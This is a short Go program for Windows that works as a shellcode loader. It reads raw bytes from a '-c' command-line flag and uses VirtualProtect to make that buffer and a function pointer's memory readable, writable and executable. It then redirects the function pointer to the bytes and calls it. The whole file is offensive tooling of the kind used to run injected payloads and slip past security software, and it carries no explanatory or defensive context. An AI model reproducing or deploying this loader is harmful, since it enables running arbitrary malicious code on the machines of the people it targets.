package main

import (
	"flag"
	"syscall"
	"unsafe"
)
var sc []byte
var temp=flag.String("c","","code insert")
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
	uintptr(lpAddress),
	uintptr(dwSize),
	uintptr(flNewProtect),
	uintptr(lpflOldProtect))
	return ret > 0
}
func main() {
	flag.Parse()
	f:= func() {}
	sc=[]byte(*temp)
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	f()
}
